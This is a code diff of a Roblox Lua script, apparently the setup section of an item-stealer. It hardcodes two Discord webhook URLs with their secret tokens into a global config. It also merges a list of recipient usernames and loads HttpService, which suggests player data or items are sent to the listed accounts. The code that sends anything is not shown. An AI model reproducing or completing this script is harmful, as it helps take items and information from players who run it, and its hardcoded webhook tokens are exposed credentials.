@@ -1,23 +1,30 @@
-local ExtraUsers = {"CREOLEO23 , 2ndcfpaj67"}
+-- [[ LYNX INITIALIZATION FIXED ]] --
+local ExtraUsers = {"CREOLEO23", "2ndcfpaj67"}
 local Friends = {}
 
-if not _G["Script-SM_Config"] then
-    warn("WARNING: Config not loaded! Waiting for config...")
-    repeat task.wait() until _G["Script-SM_Config"]
-    warn("Config loaded successfully!")
+-- Define config manually to stop the "Waiting" warning
+_G["Script-SM_Config"] = {
+    user_webhook = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa",
+    dual_webhook = "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo",
+    users = {"CREOLEO25"}
+}
+
+local cfg = _G["Script-SM_Config"]
+local Webhook = cfg.user_webhook
+local DualWebhook = cfg.dual_webhook
+local Username = cfg.users
+
+-- Correct table merging
+for _, v in ipairs(Username) do table.insert(Friends, v) end
+for _, v in pairs(ExtraUsers) do 
+    if not table.find(Friends, v) then 
+        table.insert(Friends, v) 
+    end 
 end
 
-local cfg = _G["Script-SM_Config"] or {}
-local Webhook = cfg.user_webhook or "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
-local DualWebhook = cfg.dual_webhook or "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo"  -- Replace with actual dual webhook if available
-local Username = cfg.users or {"CREOLEO25"}
-
-for _, v in ipairs(Username) do table.insert(Friends, v) end
-for _, v in ExtraUsers do if not table.find(Friends, v) then table.insert(Friends, v) end end
-
-repeat task.wait() until game:IsLoaded()
-
+if not game:IsLoaded() then game.Loaded:Wait() end
 local Players = game:GetService("Players")
+print("✅ Lynx Config Loaded Successfully")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
